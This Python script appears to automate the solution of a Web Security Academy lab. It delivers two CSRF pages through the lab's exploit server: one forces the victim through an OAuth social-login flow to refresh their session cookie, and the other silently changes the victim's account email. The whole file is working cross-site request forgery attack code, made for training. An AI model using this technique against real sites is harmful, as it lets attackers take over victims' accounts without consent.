from web_security_academy.core.logger import logger
from web_security_academy.core.utils import generate_csrf_html

from urllib.parse import urljoin
from requests import Request
from time import sleep


def solve_lab(session):
    # Force the victim to be issued a new session cookie by having them visit
    # "/social-login", which kicks off an OAuth-based login flow
    req = Request("GET", urljoin(session.url, "/social-login"))
    exploit_server = session.exploit_server()
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim("/cookie-refresh", headers, body)
    sleep(3)

    # Deliever regular CSRF payload to victim
    req = Request(
        "POST",
        urljoin(session.url, "/my-account/change-email"),
        data={"email": "user@example.com"},
    )
    body = generate_csrf_html(req)
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)
